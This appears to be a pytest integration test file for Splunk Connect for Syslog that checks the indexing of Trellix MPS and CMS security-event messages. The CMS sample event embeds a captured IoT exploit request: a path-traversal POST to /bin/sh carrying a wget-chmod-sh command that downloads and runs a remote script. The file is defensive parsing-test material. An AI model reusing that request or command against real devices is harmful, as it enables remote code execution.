# Copyright 2024 Splunk, Inc.
#
# Use of this source code is governed by a BSD-2-clause-style
# license that can be found in the LICENSE-BSD2 file or at
# https://opensource.org/licenses/BSD-2-Clause
import datetime
import pytest

from jinja2 import Environment, select_autoescape

from .sendmessage import sendsingle
from .splunkutils import  splunk_single
from .timeutils import time_operations

env = Environment(autoescape=select_autoescape(default_for_string=False))


@pytest.mark.addons("trellix")
def test_trellix_mps(
    record_property, setup_splunk, setup_sc4s
):
    mt = env.from_string(
       "{{ mark }} CEF:0|Trellix|MPS|10.0.0.10|IE|ips-event|3|externalId= rt={{bsd}} {{tzname}} proto=tcp src= spt=52490 smac= dst= dpt= dmac= cnt=1 cs1Label=sname cs1=SSLv2 Client Hello Request Detected act=notified dvchost= dvc= dvcmac=1 cn2=85307089 cn2Label=sid cfp1=12 cfp1Label=signature revision cs4= cs4Label=link flexString2=server flexString2Label=attack mode msg=MVX Correlation Status:N/A cn1=181 cn1Label=vlan\n"
    )
    dt = datetime.datetime.now(datetime.timezone.utc)
    _, _, _, _, _, tzname, epoch = time_operations(dt)
    message = mt.render(mark="<6>", bsd=dt.strftime("%b %d %Y %H:%M:%S"), tzname=tzname)

    # Tune time functions
    epoch = epoch[:-7]
    sendsingle(message, setup_sc4s[0], setup_sc4s[1][514])
    st = env.from_string(
        f'search index=netops sourcetype="trellix:mps" earliest={epoch}'
    )
    search = st.render(epoch=epoch)

    result_count, _ = splunk_single(setup_splunk, search)

    record_property("resultCount", result_count)
    record_property("message", message)

    assert result_count == 1


@pytest.mark.addons("trellix")
def test_trellix_cms(
    record_property, setup_splunk, setup_sc4s
):
    mt = env.from_string(
       "{{ mark }} CEF:0|Trellix|CMS|10.0.0.993712|IM|infection-match|1|src= spt=51802 smac= dst= dpt=80 dmac= dvchost= dvc= cn1Label=vlan cn1=101 cn2Label=sid cn2= cn3Label=cncPort cn3=80 cs1Label=sname cs1=Exploit.IoT.HNAP1 cs4Label=link cs4= cs5Label=cncHost cs5= cs6Label=channel cs6=POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1::Host: :80::Content-Type: text/plain::Connection: close::::(wget http:///sorry.sh ; chmod 777 sorry.sh ; sh sorry.sh)::::echo Content-Type: text/plain; echo; (wget http:///sorry.sh ; chmod 777 sorry.sh ; sh sorry.sh)::::~~ proto=tcp rt={{bsd}} {{tzname}} shost= externalId=827319 act=notified requestMethod=POST devicePayloadId=q1q1q1q1-q1q1-q1q1-q1q1-q1q1q1q1q1q1 start={{bsd}} {{tzname}} dvcmac=\n"
    )
    dt = datetime.datetime.now(datetime.timezone.utc)
    _, _, _, _, _, tzname, epoch = time_operations(dt)
    message = mt.render(mark="<6>", bsd=dt.strftime("%b %d %Y %H:%M:%S"), tzname=tzname)

    # Tune time functions
    epoch = epoch[:-7]
    sendsingle(message, setup_sc4s[0], setup_sc4s[1][514])
    st = env.from_string(
        f'search index=netops sourcetype="trellix:cms" earliest={epoch}'
    )
    search = st.render(epoch=epoch)

    result_count, _ = splunk_single(setup_splunk, search)

    record_property("resultCount", result_count)
    record_property("message", message)

    assert result_count == 1
